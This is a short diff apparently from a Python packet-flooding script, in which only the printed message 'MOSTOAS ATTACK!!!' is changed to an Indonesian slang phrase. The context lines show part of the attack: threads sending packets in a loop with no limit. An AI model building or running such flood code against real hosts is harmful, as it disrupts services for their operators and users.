@@ -20,9 +20,9 @@ def mostoas():
             s.sendto(asu)
             for x in range(paket_mostoas):
                 s.sendto(asu)
-            print("[•] MOSTOAS ATTACK!!!")
+            print("NGOPI BANG!!!")
         except:
-            print("[•] MOSTOAS ATTACK!!!")
+            print("NGOPI BANG!!!")
 
 for y in range(threads_mostoas):
     th = threading.Thread(target=mostoas)
